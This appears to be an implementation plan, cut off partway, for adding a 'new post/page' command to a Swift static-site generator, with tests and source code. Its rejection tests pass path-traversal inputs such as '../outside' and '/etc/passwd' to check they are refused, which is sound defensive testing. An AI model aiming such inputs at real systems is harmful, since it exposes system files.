# `hirundo new` Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** `hirundo new post` と `hirundo new page` が、設定を尊重した Markdown ファイルを実際に生成するようにする。

**Architecture:** 生成ロジックを `HirundoCore` の新しい `ContentScaffolder` に置き、CLI（`NewCommand.swift`）は引数を集めて呼ぶだけの薄いラッパにする。これは `hirundo init` が `InitCommand` + `SiteScaffolder` に分かれているのと同じ構造で、テストターゲットが `HirundoCore` にしか依存していない以上、テスト可能な唯一の置き場所でもある。

**Tech Stack:** Swift 6.0 (tools version) / macOS 12+ / swift-argument-parser / Yams / XCTest

**Spec:** `docs/superpowers/specs/2026-09-05-hirundo-new-command-design.md`

## Global Constraints

- ビルドは `swift build`、テストは `swift test`。両方ともリポジトリルートで実行する。
- テストターゲット `HirundoTests` は `HirundoCore` にのみ依存する。**`Sources/Hirundo`（CLI 実行可能ターゲット）のコードはテストできない。** ロジックを CLI に置かないこと。
- 新規テストファイルは `Tests/HirundoTests/` に置く。`Package.swift` の変更は不要（ディレクトリ全体が自動で拾われる）。
- 既存のテストを 1 つも壊さないこと。
- 生成する post のファイル名は `<slug>.md`。日付プレフィックスを付けない。
- 生成するフロントマターに `slug:` キーを **書かない**。
- 既存ファイルは絶対に上書きしない。
- `date` のフォーマットは `ISO8601DateFormatter` + `formatOptions = [.withInternetDateTime]` + `timeZone = TimeZone(secondsFromGMT: 0)`。
- コード内のコメントと識別子は英語。ユーザー向け CLI 出力も英語（既存コマンドに合わせる）。
- コミットメッセージは `<type>: <description>` 形式（`feat` / `fix` / `refactor` / `docs` / `test` / `chore`）。

---

### Task 1: `ContentScaffoldError` とそのエラーマッピング

**Files:**
- Modify: `Sources/HirundoCore/Errors.swift`（`ScaffoldError` の `toHirundoError()` 拡張の直後、`// Unified error system for consistent error handling` コメントの前に追加）
- Test: `Tests/HirundoTests/ContentScaffoldErrorMappingTests.swift`（新規）

**Interfaces:**
- Consumes: `ErrorCategory`, `HirundoErrorInfo`（`Errors.swift` に既存）
- Produces: `ContentScaffoldError` の 6 ケース（`.invalidTitle(String)`, `.invalidSlug(String)`, `.invalidPath(String)`, `.fileExists(String)`, `.cannotCreateDirectory(String)`, `.cannotWriteFile(String)`）と `func toHirundoError() -> HirundoErrorInfo`

- [ ] **Step 1: 失敗するテストを書く**

`Tests/HirundoTests/ContentScaffoldErrorMappingTests.swift` を新規作成:

```swift
import XCTest
@testable import HirundoCore

/// Verifies how `ContentScaffoldError` cases surface to the user. The category decides
/// the headline the CLI prints, so a bad `--slug` must not be reported as a disk failure.
final class ContentScaffoldErrorMappingTests: XCTestCase {

    // MARK: - Categories

    func testToHirundoError_whenInputInvalid_usesConfigurationCategory() {
        XCTAssertEqual(ContentScaffoldError.invalidTitle("empty").toHirundoError().category, .configuration)
        XCTAssertEqual(ContentScaffoldError.invalidSlug("bad").toHirundoError().category, .configuration)
        XCTAssertEqual(ContentScaffoldError.invalidPath("bad").toHirundoError().category, .configuration)
    }

    func testToHirundoError_whenIOFails_usesFilesystemCategory() {
        XCTAssertEqual(ContentScaffoldError.fileExists("/p").toHirundoError().category, .filesystem)
        XCTAssertEqual(ContentScaffoldError.cannotCreateDirectory("/p").toHirundoError().category, .filesystem)
        XCTAssertEqual(ContentScaffoldError.cannotWriteFile("/p").toHirundoError().category, .filesystem)
    }

    func testToHirundoError_whenTitleInvalid_isNotPresentedAsDiskProblem() {
        let info = ContentScaffoldError.invalidTitle("Title cannot be empty").toHirundoError()

        XCTAssertFalse(
            info.userMessage.contains("File System Error"),
            "A bad title must not be presented as a file system error"
        )
    }

    // MARK: - Per-error suggestions

    func testToHirundoError_whenFileExists_suggestsADifferentName() {
        let info = ContentScaffoldError.fileExists("/p/hello-world.md").toHirundoError()

        XCTAssertNotNil(info.suggestion)
        XCTAssertTrue(
            info.suggestedAction.contains("--slug"),
            "Expected the --slug hint, got: \(info.suggestedAction)"
        )
        XCTAssertNotEqual(info.suggestedAction, ErrorCategory.filesystem.defaultSuggestedAction)
        XCTAssertFalse(
            info.userMessage.contains("available disk space"),
            "A name collision is not a disk space problem"
        )
    }

    func testToHirundoError_whenSlugInvalid_suggestsUsableCharacters() {
        let info = ContentScaffoldError.invalidSlug("contains a slash").toHirundoError()

        XCTAssertNotNil(info.suggestion)
        XCTAssertTrue(info.suggestedAction.contains("--slug"))
    }

    func testToHirundoError_whenPathInvalid_mentionsTheContentDirectory() {
        let info = ContentScaffoldError.invalidPath("escapes the content directory").toHirundoError()

        XCTAssertNotNil(info.suggestion)
        XCTAssertTrue(info.suggestedAction.contains("--path"))
    }

    func testToHirundoError_whenIOFails_keepsTheGenericSuggestion() {
        XCTAssertNil(ContentScaffoldError.cannotWriteFile("/p").toHirundoError().suggestion)
        XCTAssertNil(ContentScaffoldError.cannotCreateDirectory("/p").toHirundoError().suggestion)
    }

    // MARK: - Messages

    func testErrorDescription_includesTheOffendingPath() {
        XCTAssertEqual(
            ContentScaffoldError.fileExists("/p/hello.md").errorDescription,
            "File already exists: /p/hello.md"
        )
    }

    func testEquatable_distinguishesCasesAndPayloads() {
        XCTAssertEqual(ContentScaffoldError.fileExists("/a"), ContentScaffoldError.fileExists("/a"))
        XCTAssertNotEqual(ContentScaffoldError.fileExists("/a"), ContentScaffoldError.fileExists("/b"))
        XCTAssertNotEqual(ContentScaffoldError.invalidSlug("x"), ContentScaffoldError.invalidPath("x"))
    }
}
```

- [ ] **Step 2: テストが失敗することを確認**

Run: `swift test --filter ContentScaffoldErrorMappingTests`
Expected: コンパイルエラー — `cannot find 'ContentScaffoldError' in scope`

- [ ] **Step 3: 最小の実装を書く**

`Sources/HirundoCore/Errors.swift` の `extension ScaffoldError { ... }` ブロックの閉じ括弧の直後、`// Unified error system for consistent error handling` の行の前に追加:

```swift
/// Errors raised while scaffolding a single Markdown content file.
public enum ContentScaffoldError: Error, LocalizedError, Equatable, Sendable {
    case invalidTitle(String)
    case invalidSlug(String)
    case invalidPath(String)
    case fileExists(String)
    case cannotCreateDirectory(String)
    case cannotWriteFile(String)

    public var errorDescription: String? {
        switch self {
        case .invalidTitle(let details):
            return "Invalid title: \(details)"
        case .invalidSlug(let details):
            return "Invalid slug: \(details)"
        case .invalidPath(let details):
            return "Invalid path: \(details)"
        case .fileExists(let path):
            return "File already exists: \(path)"
        case .cannotCreateDirectory(let path):
            return "Could not create directory: \(path)"
        case .cannotWriteFile(let path):
            return "Could not write file: \(path)"
        }
    }
}

extension ContentScaffoldError {
    /// Converts this error into the unified Hirundo error representation.
    ///
    /// Input mistakes (an unusable title, slug, or path) are reported as configuration
    /// problems so the CLI does not tell the user to check their disk space over a typo.
    /// A name collision is a filesystem fact, but it carries its own suggestion because
    /// the generic "check permissions and disk space" advice is useless for it.
    /// - Returns: A `HirundoErrorInfo` with a stable code, a matching category, and an
    ///   error-specific suggestion where one is useful.
    public func toHirundoError() -> HirundoErrorInfo {
        let code: String
        let category: ErrorCategory
        let suggestion: String?
        switch self {
        case .invalidTitle:
            code = "INVALID_TITLE"
            category = .configuration
            suggestion = "Pass a non-empty title without control characters, "
                + "for example: hirundo new post \"My First Post\""
        case .invalidSlug:
            code = "INVALID_SLUG"
            category = .configuration
            suggestion = "Pass a --slug that names a single file, "
                + "using letters, digits and hyphens only"
        case .invalidPath:
            code = "INVALID_PATH"
            category = .configuration
            suggestion = "Pass a --path relative to the content directory, "
                + "for example --path about/team"
        case .fileExists:
            code = "FILE_EXISTS"
            category = .filesystem
            suggestion = "Pass a different --slug or --path, or edit the existing file"
        case .cannotCreateDirectory:
            code = "CREATE_DIR_FAILED"
            category = .filesystem
            suggestion = nil
        case .cannotWriteFile:
            code = "WRITE_FAILED"
            category = .filesystem
            suggestion = nil
        }
        return HirundoErrorInfo(
            category: category,
            code: code,
            details: self.localizedDescription,
            suggestion: suggestion,
            underlyingError: self
        )
    }
}
```

- [ ] **Step 4: テストが通ることを確認**

Run: `swift test --filter ContentScaffoldErrorMappingTests`
Expected: PASS（9 テスト）

- [ ] **Step 5: コミット**

```bash
git add Sources/HirundoCore/Errors.swift Tests/HirundoTests/ContentScaffoldErrorMappingTests.swift
git commit -m "feat: add ContentScaffoldError for content generation failures

Mirrors ScaffoldError: input mistakes map to the configuration category so
a typo in --slug is not reported as a disk problem, and a name collision
carries its own suggestion instead of the generic disk-space advice."
```

---

### Task 2: `ContentTemplates` — フロントマターの生成

**Files:**
- Create: `Sources/HirundoCore/Scaffold/ContentTemplates.swift`
- Test: `Tests/HirundoTests/ContentTemplatesTests.swift`（新規）

**Interfaces:**
- Consumes: `ScaffoldTemplates.yamlQuoted(_:)`（`Sources/HirundoCore/Scaffold/ScaffoldTemplates.swift:5` に既存、`internal`）
- Produces:
  - `enum ContentKind: Sendable { case post, page }`
  - `var ContentKind.defaultTemplate: String`（post → `"post.html"`、page → `"default.html"`）
  - `enum ContentTemplates`
  - `static func ContentTemplates.markdown(kind:title:date:categories:tags:draft:template:) -> String`

なぜ `ContentKind` をここで定義するか: 種別ごとの既定テンプレート名はこのファイルが唯一の出所であり、`ContentScaffolder` と型定義を分けると 2 箇所を見ないと生成物が分からなくなる。

- [ ] **Step 1: 失敗するテストを書く**

`Tests/HirundoTests/ContentTemplatesTests.swift` を新規作成:

```swift
import XCTest
@testable import HirundoCore

/// The generated front matter must round-trip through the same parser the build uses.
/// A template that only "looks like YAML" is not good enough.
final class ContentTemplatesTests: XCTestCase {

    private let fixedDate = Date(timeIntervalSince1970: 1_772_000_000) // 2026-02-25T06:13:20Z

    private func frontMatter(of markdown: String) throws -> [String: Any] {
        let result = try MarkdownParser().parse(markdown)
        return try XCTUnwrap(result.frontMatter, "Expected parseable front matter in:\n\(markdown)")
    }

    // MARK: - Post

    func testPost_writesTitleDateAndTemplate() throws {
        let markdown = ContentTemplates.markdown(
            kind: .post,
            title: "My Post Title",
            date: fixedDate,
            categories: [],
            tags: [],
            draft: false,
            template: "post.html"
        )
        let fm = try frontMatter(of: markdown)

        XCTAssertEqual(fm["title"] as? String, "My Post Title")
        XCTAssertEqual(fm["template"] as? String, "post.html")
        XCTAssertNotNil(fm["date"], "A post must carry a date")
    }

    func testPost_datesUseInternetDateTimeInUTC() throws {
        let markdown = ContentTemplates.markdown(
            kind: .post,
            title: "T",
            date: fixedDate,
            categories: [],
            tags: [],
            draft: false,
            template: "post.html"
        )

        XCTAssertTrue(
            markdown.contains("date: 2026-02-25T06:13:20Z"),
            "Expected an ISO8601 internet date-time in UTC, got:\n\(markdown)"
        )
    }

    func testPost_neverWritesASlugKey() throws {
        // The output URL comes from the file name while RSS links come from Post.slug.
        // Writing a slug: key lets those two drift apart.
        let markdown = ContentTemplates.markdown(
            kind: .post,
            title: "My Post Title",
            date: fixedDate,
            categories: [],
            tags: [],
            draft: false,
            template: "post.html"
        )
        let fm = try frontMatter(of: markdown)

        XCTAssertNil(fm["slug"], "The generated front matter must not pin a slug")
    }

    func testPost_omitsEmptyCategoriesAndTags() throws {
        let markdown = ContentTemplates.markdown(
            kind: .post,
            title: "T",
            date: fixedDate,
            categories: [],
            tags: [],
            draft: false,
            template: "post.html"
        )
        let fm = try frontMatter(of: markdown)

        XCTAssertNil(fm["categories"])
        XCTAssertNil(fm["tags"])
    }

    func testPost_writesCategoriesAndTagsAsArrays() throws {
        let markdown = ContentTemplates.markdown(
            kind: .post,
            title: "T",
            date: fixedDate,
            categories: ["swift", "development"],
            tags: ["static-site"],
            draft: false,
            template: "post.html"
        )
        let fm = try frontMatter(of: markdown)

        XCTAssertEqual(fm["categories"] as? [String], ["swift", "development"])
        XCTAssertEqual(fm["tags"] as? [String], ["static-site"])
    }

    func testPost_omitsDraftKeyWhenNotADraft() throws {
        let markdown = ContentTemplates.markdown(
            kind: .post,
            title: "T",
            date: fixedDate,
            categories: [],
            tags: [],
            draft: false,
            template: "post.html"
        )
        let fm = try frontMatter(of: markdown)

        XCTAssertNil(fm["draft"], "draft: false is the default; writing it is noise")
    }

    func testPost_writesDraftTrueWhenADraft() throws {
        let markdown = ContentTemplates.markdown(
            kind: .post,
            title: "T",
            date: fixedDate,
            categories: [],
            tags: [],
            draft: true,
            template: "post.html"
        )
        let fm = try frontMatter(of: markdown)

        XCTAssertEqual(fm["draft"] as? Bool, true)
    }

    // MARK: - Page

    func testPage_writesTitleAndTemplateButNoDate() throws {
        let markdown = ContentTemplates.markdown(
            kind: .page,
            title: "About",
            date: fixedDate,
            categories: [],
            tags: [],
            draft: false,
            template: "default.html"
        )
        let fm = try frontMatter(of: markdown)

        XCTAssertEqual(fm["title"] as? String, "About")
        XCTAssertEqual(fm["template"] as? String, "default.html")
        XCTAssertNil(fm["date"], "Pages match the starter content, which carries no date")
    }

    // MARK: - Escaping

    func testTitlesWithQuotesAndBackslashesRoundTrip() throws {
        let tricky = #"He said "hello" \ goodbye"#
        let markdown = ContentTemplates.markdown(
            kind: .page,
            title: tricky,
            date: fixedDate,
            categories: [],
            tags: [],
            draft: false,
            template: "default.html"
        )
        let fm = try frontMatter(of: markdown)

        XCTAssertEqual(fm["title"] as? String, tricky)
    }

    func testCategoriesWithQuotesRoundTrip() throws {
        let markdown = ContentTemplates.markdown(
            kind: .post,
            title: "T",
            date: fixedDate,
            categories: [#"say "hi""#],
            tags: [],
            draft: false,
            template: "post.html"
        )
        let fm = try frontMatter(of: markdown)

        XCTAssertEqual(fm["categories"] as? [String], [#"say "hi""#])
    }

    // MARK: - Body

    func testBodyStartsWithTheTitleAsAHeading() {
        let markdown = ContentTemplates.markdown(
            kind: .page,
            title: "About",
            date: fixedDate,
            categories: [],
            tags: [],
            draft: false,
            template: "default.html"
        )

        XCTAssertTrue(markdown.contains("\n# About\n"), "Got:\n\(markdown)")
    }

    // MARK: - Defaults

    func testDefaultTemplatePerKind() {
        XCTAssertEqual(ContentKind.post.defaultTemplate, "post.html")
        XCTAssertEqual(ContentKind.page.defaultTemplate, "default.html")
    }
}
```

- [ ] **Step 2: テストが失敗することを確認**

Run: `swift test --filter ContentTemplatesTests`
Expected: コンパイルエラー — `cannot find 'ContentTemplates' in scope`

- [ ] **Step 3: 最小の実装を書く**

`Sources/HirundoCore/Scaffold/ContentTemplates.swift` を新規作成:

```swift
import Foundation

/// The kind of content `ContentScaffolder` creates.
public enum ContentKind: Sendable {
    case post
    case page

    /// Template written into the `template:` key when the caller does not name one.
    ///
    /// These match what the build falls back to on its own (`PageRenderer`), but the
    /// generated file states them explicitly, the same way `hirundo init` does — so the
    /// user can see which template a file uses without knowing the fallback rules.
    public var defaultTemplate: String {
        switch self {
        case .post: return "post.html"
        case .page: return "default.html"
        }
    }
}

/// Builds the Markdown body of a newly created content file.
enum ContentTemplates {
    /// Formatter for the `date:` key.
    ///
    /// Matches `ScaffoldTemplates.helloWorldPost` so every file Hirundo generates spells
    /// dates the same way.
    private static func formattedDate(_ date: Date) -> String {
        let formatter = ISO8601DateFormatter()
        formatter.formatOptions = [.withInternetDateTime]
        formatter.timeZone = TimeZone(secondsFromGMT: 0)
        return formatter.string(from: date)
    }

    private static func yamlArray(_ values: [String]) -> String {
        "[" + values.map { ScaffoldTemplates.yamlQuoted($0) }.joined(separator: ", ") + "]"
    }

    /// Renders a complete Markdown file, front matter included.
    ///
    /// Keys that carry no information are omitted rather than written with a default
    /// value: an absent `draft` means the same as `draft: false`, and an empty
    /// `categories: []` only adds noise to a file the user is about to edit.
    ///
    /// No `slug:` key is ever written. The output URL is derived from the file name
    /// while RSS links are derived from `Post.slug`, so a `slug:` that disagrees with
    /// the file name would make those two point at different URLs.
    static func markdown(
        kind: ContentKind,
        title: String,
        date: Date,
        categories: [String],
        tags: [String],
        draft: Bool,
        template: String
    ) -> String {
        var lines: [String] = ["---"]
        lines.append("title: \(ScaffoldTemplates.yamlQuoted(title))")
        if kind == .post {
            lines.append("date: \(formattedDate(date))")
        }
        if !categories.isEmpty {
            lines.append("categories: \(yamlArray(categories))")
        }
        if !tags.isEmpty {
            lines.append("tags: \(yamlArray(tags))")
        }
        if draft {
            lines.append("draft: true")
        }
        lines.append("template: \(ScaffoldTemplates.yamlQuoted(template))")
        lines.append("---")

        return lines.joined(separator: "\n") + "\n\n# \(title)\n\n"
    }
}
```

- [ ] **Step 4: テストが通ることを確認**

Run: `swift test --filter ContentTemplatesTests`
Expected: PASS（12 テスト）

もし `testTitlesWithQuotesAndBackslashesRoundTrip` が落ちる場合、`ScaffoldTemplates.yamlQuoted` のエスケープ（バックスラッシュと二重引用符）を確認すること。`yamlQuoted` は変更しないこと — `SiteScaffolder` が同じものを使っている。

- [ ] **Step 5: コミット**

```bash
git add Sources/HirundoCore/Scaffold/ContentTemplates.swift Tests/HirundoTests/ContentTemplatesTests.swift
git commit -m "feat: add ContentTemplates for generated content front matter

Renders the Markdown body for a new post or page. Keys that carry no
information (draft: false, empty categories) are omitted, and no slug: key
is ever written: output URLs come from the file name while RSS links come
from Post.slug, so a slug: that disagreed with the file name would make the
two point at different URLs."
```

---

### Task 3: `ContentScaffolder` — パス解決・検証・書き込み

**Files:**
- Create: `Sources/HirundoCore/Scaffold/ContentScaffolder.swift`
- Test: `Tests/HirundoTests/ContentScaffolderTests.swift`（新規）

**Interfaces:**
- Consumes:
  - `ContentKind`, `ContentTemplates.markdown(kind:title:date:categories:tags:draft:template:)`（Task 2）
  - `ContentScaffoldError`（Task 1）
  - `Build`（`build.contentDirectory`）, `Limits`（`limits.maxTitleLength`, `limits.maxFilenameLength`）
  - `ConfigValidation.validateNonEmptyAndLength(_:maxLength:fieldName:)`
  - `String.slugify(maxLength:)`（`StringExtensions.swift`、`internal`）
  - `PathSanitizer.sanitize(_:)`
- Produces:
  - `struct ContentScaffoldOptions`（`title`, `slug`, `path`, `categories`, `tags`, `draft`, `template`）
  - `static func ContentScaffoldOptions.parseList(_ value: String?) -> [String]`
  - `struct ContentScaffoldResult`（`url: URL`, `relativePath: String`）
  - `struct ContentScaffolder` と
    `func scaffold(in:build:limits:kind:options:date:) throws -> ContentScaffoldResult`

カンマ区切りのパースを CLI ではなくここに置く理由: CLI ターゲットはテストできない
（Global Constraints 参照）。「空要素を落とす」「重複を落とす」「順序を保つ」という
3 つの規則は間違えやすく、テストが必要である。

- [ ] **Step 1: 失敗するテストを書く**

`Tests/HirundoTests/ContentScaffolderTests.swift` を新規作成:

```swift
import XCTest
@testable import HirundoCore

final class ContentScaffolderTests: XCTestCase {
    var projectRoot: URL!

    override func setUp() {
        super.setUp()
        projectRoot = FileManager.default.temporaryDirectory
            .appendingPathComponent("hirundo-content-\(UUID().uuidString)")
        try? FileManager.default.createDirectory(at: projectRoot, withIntermediateDirectories: true)
    }

    override func tearDown() {
        try? FileManager.default.removeItem(at: projectRoot)
        super.tearDown()
    }

    // MARK: - Helpers

    private func scaffold(
        kind: ContentKind,
        _ options: ContentScaffoldOptions,
        build: Build = Build.defaultBuild(),
        limits: Limits = Limits(),
        date: Date = Date(timeIntervalSince1970: 1_772_000_000)
    ) throws -> ContentScaffoldResult {
        try ContentScaffolder().scaffold(
            in: projectRoot,
            build: build,
            limits: limits,
            kind: kind,
            options: options,
            date: date
        )
    }

    private func frontMatter(at url: URL) throws -> [String: Any] {
        let text = try String(contentsOf: url, encoding: .utf8)
        let parsed = try MarkdownParser().parse(text)
        return try XCTUnwrap(parsed.frontMatter)
    }

    private func assertThrows(
        _ expected: ContentScaffoldError,
        _ body: () throws -> ContentScaffoldResult,
        file: StaticString = #filePath,
        line: UInt = #line
    ) {
        do {
            _ = try body()
            XCTFail("Expected \(expected), but the call succeeded", file: file, line: line)
        } catch let error as ContentScaffoldError {
            switch (error, expected) {
            case (.invalidTitle, .invalidTitle),
                 (.invalidSlug, .invalidSlug),
                 (.invalidPath, .invalidPath),
                 (.fileExists, .fileExists),
                 (.cannotCreateDirectory, .cannotCreateDirectory),
                 (.cannotWriteFile, .cannotWriteFile):
                break
            default:
                XCTFail("Expected \(expected), got \(error)", file: file, line: line)
            }
        } catch {
            XCTFail("Expected \(expected), got \(error)", file: file, line: line)
        }
    }

    // MARK: - Post: location

    func testPost_landsUnderContentPosts() throws {
        let result = try scaffold(kind: .post, ContentScaffoldOptions(title: "Hello World"))

        XCTAssertEqual(result.relativePath, "content/posts/hello-world.md")
        XCTAssertTrue(FileManager.default.fileExists(atPath: result.url.path))
    }

    func testPost_honoursAnExplicitSlug() throws {
        let result = try scaffold(
            kind: .post,
            ContentScaffoldOptions(title: "Hello World", slug: "custom-name")
        )

        XCTAssertEqual(result.relativePath, "content/posts/custom-name.md")
    }

    func testPost_slugifiesNonASCIITitles() throws {
        let result = try scaffold(kind: .post, ContentScaffoldOptions(title: "こんにちは"))

        // slugify percent-encodes non-ASCII, so the name stays URL-safe.
        XCTAssertTrue(result.relativePath.hasPrefix("content/posts/"))
        XCTAssertTrue(result.relativePath.hasSuffix(".md"))
        XCTAssertFalse(result.relativePath.contains("こんにちは"))
        XCTAssertTrue(FileManager.default.fileExists(atPath: result.url.path))
    }

    func testPost_truncatesNamesToTheFilenameLimit() throws {
        let longTitle = String(repeating: "a", count: 300)
        let result = try scaffold(
            kind: .post,
            ContentScaffoldOptions(title: longTitle),
            limits: Limits(maxFilenameLength: 40, maxTitleLength: 500)
        )

        let name = URL(fileURLWithPath: result.relativePath).lastPathComponent
        XCTAssertLessThanOrEqual(name.count, 40, "Got a \(name.count)-character name: \(name)")
        XCTAssertTrue(FileManager.default.fileExists(atPath: result.url.path))
    }

    func testPost_respectsACustomContentDirectory() throws {
        let build = try Build(contentDirectory: "docs")
        let result = try scaffold(kind: .post, ContentScaffoldOptions(title: "Hello"), build: build)

        XCTAssertEqual(result.relativePath, "docs/posts/hello.md")
        XCTAssertTrue(FileManager.default.fileExists(atPath: result.url.path))
    }

    // MARK: - Post: content

    func testPost_writesParseableFrontMatter() throws {
        let result = try scaffold(
            kind: .post,
            ContentScaffoldOptions(
                title: "Hello World",
                categories: ["swift"],
                tags: ["ssg", "web"],
                draft: true
            )
        )
        let fm = try frontMatter(at: result.url)

        XCTAssertEqual(fm["title"] as? String, "Hello World")
        XCTAssertEqual(fm["template"] as? String, "post.html")
        XCTAssertEqual(fm["categories"] as? [String], ["swift"])
        XCTAssertEqual(fm["tags"] as? [String], ["ssg", "web"])
        XCTAssertEqual(fm["draft"] as? Bool, true)
        XCTAssertNotNil(fm["date"])
        XCTAssertNil(fm["slug"], "The file name is the only source of the slug")
    }

    func testPost_honoursAnExplicitTemplate() throws {
        let result = try scaffold(
            kind: .post,
            ContentScaffoldOptions(title: "Hello", template: "custom.html")
        )

        XCTAssertEqual(try frontMatter(at: result.url)["template"] as? String, "custom.html")
    }

    // MARK: - Page

    func testPage_landsDirectlyUnderContent() throws {
        let result = try scaffold(kind: .page, ContentScaffoldOptions(title: "About Us"))

        XCTAssertEqual(result.relativePath, "content/about-us.md")
        XCTAssertEqual(try frontMatter(at: result.url)["template"] as? String, "default.html")
        XCTAssertNil(try frontMatter(at: result.url)["date"])
    }

    func testPage_honoursANestedPathAndCreatesDirectories() throws {
        let result = try scaffold(
            kind: .page,
            ContentScaffoldOptions(title: "Team", path: "about/team")
        )

        XCTAssertEqual(result.relativePath, "content/about/team.md")
        XCTAssertTrue(FileManager.default.fileExists(atPath: result.url.path))
    }

    func testPage_doesNotDoubleTheMarkdownExtension() throws {
        let result = try scaffold(
            kind: .page,
            ContentScaffoldOptions(title: "Team", path: "about/team.md")
        )

        XCTAssertEqual(result.relativePath, "content/about/team.md")
    }

    func testPage_prefersPathOverSlug() throws {
        let result = try scaffold(
            kind: .page,
            ContentScaffoldOptions(title: "Team", slug: "ignored", path: "about/team")
        )

        XCTAssertEqual(result.relativePath, "content/about/team.md")
    }

    // MARK: - Rejections

    func testRejectsAnEmptyTitle() {
        assertThrows(.invalidTitle("")) {
            try scaffold(kind: .page, ContentScaffoldOptions(title: "   "))
        }
    }

    func testRejectsATitleOverTheLimit() {
        assertThrows(.invalidTitle("")) {
            try scaffold(
                kind: .page,
                ContentScaffoldOptions(title: String(repeating: "a", count: 201)),
                limits: Limits(maxTitleLength: 200)
            )
        }
    }

    func testRejectsTitlesWithLineSeparators() {
        // U+2028 survives CharacterSet.controlCharacters but a YAML parser folds it to a
        // space, so the title would not round-trip.
        assertThrows(.invalidTitle("")) {
            try scaffold(kind: .page, ContentScaffoldOptions(title: "Hello\u{2028}World"))
        }
    }

    func testRejectsTitlesWithControlCharacters() {
        assertThrows(.invalidTitle("")) {
            try scaffold(kind: .page, ContentScaffoldOptions(title: "Hello\u{0007}World"))
        }
    }

    func testRejectsASlugContainingAPathSeparator() {
        assertThrows(.invalidSlug("")) {
            try scaffold(kind: .post, ContentScaffoldOptions(title: "T", slug: "a/b"))
        }
    }

    func testRejectsASlugTraversingUpwards() {
        assertThrows(.invalidSlug("")) {
            try scaffold(kind: .post, ContentScaffoldOptions(title: "T", slug: ".."))
        }
    }

    func testRejectsAPathTraversingUpwards() {
        assertThrows(.invalidPath("")) {
            try scaffold(kind: .page, ContentScaffoldOptions(title: "T", path: "../outside"))
        }
    }

    func testRejectsAnAbsolutePath() {
        assertThrows(.invalidPath("")) {
            try scaffold(kind: .page, ContentScaffoldOptions(title: "T", path: "/etc/passwd"))
        }
    }

    func testRejectsAPathThatSanitizesToNothing() {
        assertThrows(.invalidPath("")) {
            try scaffold(kind: .page, ContentScaffoldOptions(title: "T", path: "   "))
        }
    }

    // MARK: - Comma-separated option parsing

    func testParseList_returnsEmptyForNil() {
        XCTAssertEqual(ContentScaffoldOptions.parseList(nil), [])
    }

    func testParseList_trimsEntries() {
        XCTAssertEqual(ContentScaffoldOptions.parseList(" swift , web "), ["swift", "web"])
    }

    func testParseList_dropsBlanksAndDuplicatesKeepingOrder() {
        XCTAssertEqual(
            ContentScaffoldOptions.parseList("swift, , swift ,web"),
            ["swift", "web"]
        )
    }

    func testParseList_returnsEmptyForACommaOnlyValue() {
        XCTAssertEqual(ContentScaffoldOptions.parseList(",,,"), [])
    }

    // MARK: - Collisions

    func testRefusesToOverwriteAndLeavesTheExistingFileIntact() throws {
        let first = try scaffold(kind: .post, ContentScaffoldOptions(title: "Hello World"))
        let original = try String(contentsOf: first.url, encoding: .utf8)

        assertThrows(.fileExists("")) {
            try scaffold(
                kind: .post,
                ContentScaffoldOptions(title: "Hello World", tags: ["different"])
            )
        }

        XCTAssertEqual(
            try String(contentsOf: first.url, encoding: .utf8),
            original,
            "A collision must not touch the file that is already there"
        )
    }

    // MARK: - Integration

    func testGeneratedPostIsExcludedFromABuildWithoutDrafts() async throws {
        _ = try SiteScaffolder().scaffold(
            at: projectRoot,
            options: SiteScaffoldOptions(title: "Test Site", includeBlog: true, force: true)
        )
        let result = try scaffold(
            kind: .post,
            ContentScaffoldOptions(title: "Secret Post", draft: true)
        )
        XCTAssertTrue(FileManager.default.fileExists(atPath: result.url.path))

        let generator = try SiteGenerator(projectPath: projectRoot.path)
        try await generator.build(clean: true, includeDrafts: false)

        let output = projectRoot.appendingPathComponent("_site/posts/secret-post/index.html")
        XCTAssertFalse(
            FileManager.default.fileExists(atPath: output.path),
            "A draft must not reach the output directory"
        )
    }

    func testGeneratedPostBuildsToItsSlugURL() async throws {
        _ = try SiteScaffolder().scaffold(
            at: projectRoot,
            options: SiteScaffoldOptions(title: "Test Site", includeBlog: true, force: true)
        )
        _ = try scaffold(kind: .post, ContentScaffoldOptions(title: "Second Post"))

        let generator = try SiteGenerator(projectPath: projectRoot.path)
        try await generator.build(clean: true, includeDrafts: false)

        let output = projectRoot.appendingPathComponent("_site/posts/second-post/index.html")
        XCTAssertTrue(
            FileManager.default.fileExists(atPath: output.path),
            "Expected /posts/second-post/ from content/posts/second-post.md"
        )
    }
}
```

- [ ] **Step 2: テストが失敗することを確認**

Run: `swift test --filter ContentScaffolderTests`
Expected: コンパイルエラー — `cannot find 'ContentScaffolder' in scope`

- [ ] **Step 3: 最小の実装を書く**

`Sources/HirundoCore/Scaffold/ContentScaffolder.swift` を新規作成:

```swift
import Foundation

/// Input for creating one Markdown content file.
public struct ContentScaffoldOptions: Sendable {
    /// Title written into the front matter and used as the body heading.
    public var title: String
    /// File name (without extension) for the new file. Derived from `title` when nil.
    public var slug: String?
    /// Path relative to the content directory. Takes precedence over `slug` when both
    /// are given; only `hirundo new page` passes it.
    public var path: String?
    public var categories: [String]
    public var tags: [String]
    public var draft: Bool
    /// Value for the `template:` key. Uses the kind's default when nil.
    public var template: String?

    /// Creates scaffold options.
    public init(
        title: String,
        slug: String? = nil,
        path: String? = nil,
        categories: [String] = [],
        tags: [String] = [],
        draft: Bool = false,
        template: String? = nil
    ) {
        self.title = title
        self.slug = slug
        self.path = path
        self.categories = categories
        self.tags = tags
        self.draft = draft
        self.template = template
    }

    /// Splits a comma-separated option value into a clean list.
    ///
    /// Trims each entry, drops empties, and removes duplicates while keeping the order the
    /// user typed, so `"swift, , swift ,web"` becomes `["swift", "web"]`.
    /// - Parameter value: Raw option value, or `nil` when the option was not passed.
    /// - Returns: The parsed list, empty when there is nothing usable.
    public static func parseList(_ value: String?) -> [String] {
        guard let value else { return [] }
        var seen = Set<String>()
        return value
            .split(separator: ",", omittingEmptySubsequences: false)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty && seen.insert($0).inserted }
    }
}

/// A successfully created content file.
public struct ContentScaffoldResult: Sendable {
    /// Absolute URL of the created file.
    public let url: URL
    /// Path relative to the project root, e.g. `"content/posts/hello-world.md"`.
    public let relativePath: String

    /// Creates a result.
    public init(url: URL, relativePath: String) {
        self.url = url
        self.relativePath = relativePath
    }
}

